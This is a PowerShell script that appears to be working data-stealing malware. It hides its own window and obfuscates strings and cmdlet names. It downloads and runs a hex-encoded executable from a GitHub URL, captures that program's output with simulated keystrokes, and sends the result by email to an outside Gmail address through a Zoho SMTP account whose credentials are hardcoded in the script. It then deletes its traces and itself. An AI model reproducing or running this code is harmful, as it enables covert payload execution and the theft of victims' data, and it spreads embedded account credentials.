# --- LAYER 1: WINDOW HIDING (API Fragmentation) ---
$m_sig = @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
$v_win = "W"+"in"+"32"
$v_at = "Ad"+"d-Ty"+"pe"
$v_api = & $v_at -MemberDefinition $m_sig -Name "W32S" -Namespace $v_win -PassThru
$v_meth = "Show"+"Window"
$v_api::$v_meth((Get-Process -Id $PID).MainWindowHandle, 0)

# --- LAYER 2: DYNAMIC CLASS REFERENCES ---
$c_attach = "Net.M"+"ail.Att"+"achment"
$c_msg = "Net.M"+"ail.MailM"+"essage"
$c_client = "Net.M"+"ail.SmtpCl"+"ient"
$c_cred = "Net.Net"+"workCre"+"dential"

function New-M-Att {
    param ([Parameter(Mandatory=$true)]$d_in, $f_n = "ani.txt", [switch]$s_cr)
    try {
        $c_stream = $d_in
        if ($s_cr) {
            $b_utf = [System.Text.Encoding]::UTF8.GetBytes($d_in)
            $c_stream = [System.Convert]::ToBase64String($b_utf)
        }
        $m_s = New-Object System.IO.MemoryStream
        $w_r = New-Object System.IO.StreamWriter($m_s)
        $w_r.Write($c_stream); $w_r.Flush(); $m_s.Position = 0
        return New-Object $c_attach($m_s, $f_n)
    } catch { return $null }
}

function Send-Z-Mail {
    param ($s_bj, $v_list = @())
    $u_z = "zqrvstef0rc5edk@zohomail.com"
    $p_z = "LHjzKTbzDApt"
    
    $m_obj = New-Object $c_msg
    $m_obj.From = "Ang Mangagawa <$u_z>"
    $m_obj.To.Add("srve650@gmail.com")
    $m_obj.Subject = $s_bj
    $m_obj.Body = "Ani report."

    foreach ($a in $v_list) { if ($a) { $m_obj.Attachments.Add($a) } }

    $s_cli = New-Object $c_client("smtp.zoho.com", 587)
    $s_cli.EnableSsl = $true
    $s_cli.Credentials = New-Object $c_cred($u_z, $p_z)
    try { $s_cli.Send($m_obj) } finally { $m_obj.Dispose(); $s_cli.Dispose() }
}

# --- LAYER 3: PAYLOAD EXECUTION (Cmdlet Backticks) ---
$u_src = "ht"+"tp"+"s://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
$r_str = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$t_path = [System.IO.Path]::Combine($env:TEMP, "$r_str.txt")

I`nvoke-W`ebR`equest -Uri $u_src -OutFile $t_path

$h_str = G`et-C`ontent $t_path -Raw
$b_raw = [byte[]]::new($h_str.Length / 2)
for ($i = 0; $i -lt $h_str.Length; $i += 2) {
    $b_raw[$i / 2] = [convert]::ToByte($h_str.Substring($i, 2), 16)
}

$e_path = Join-Path $env:TEMP "$r_str.exe"
[System.IO.File]::WriteAllBytes($e_path, $b_raw)
(Get-Item $e_path).Attributes = 'Hidden'

$p_obj = S`tart-P`rocess $e_path -PassThru
$o_log = "$env:TEMP\sys_$r_str.log"

Start-Sleep -Seconds 2
$v_forms = "System.Win"+"dows.Forms"
[Reflection.Assembly]::LoadWithPartialName($v_forms) | Out-Null
$v_sk = "[System.Windows.Forms.SendKeys]"
$v_sw = "Send"+"Wait"

$($v_sk)::$v_sw("^(a)")
Start-Sleep -Milliseconds 500
$($v_sk)::$v_sw("^(s)")
Start-Sleep -Milliseconds 1000
$($v_sk)::$v_sw("$o_log")
Start-Sleep -Milliseconds 500
$($v_sk)::$v_sw("{ENTER}")

Start-Sleep -Seconds 1

# --- LAYER 4: CLEANUP & EXFIL ---
try {
    if ($p_obj) { S`top-P`rocess -Id $p_obj.Id -Force; $p_obj.Dispose() }
} catch {}

foreach ($f in @($e_path, $t_path)) { if (Test-Path $f) { R`emove-I`tem $f -Force } }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (Test-Path $o_log) {
    $r_txt = G`et-C`ontent $o_log -Raw
    $a_file = New-M-Att -d_in $r_txt -f_n "data_$r_str.txt" -s_cr
    if ($a_file) {
        Send-Z-Mail -s_bj "Log_$r_str" -v_list @($a_file)
        $a_file.Dispose()
        R`emove-I`tem $o_log -Force
    }
}

# --- LAYER 5: SELF-DESTRUCT (Taskkill Bypass) ---
$s_self = $MyInvocation.MyCommand.Definition
$c_sh = "cm"+"d.ex"+"e"
$a_sh = "/c taskkill /F /IM powershell.exe & del `"$s_self`""
S`tart-P`rocess $c_sh -ArgumentList $a_sh -WindowStyle Hidden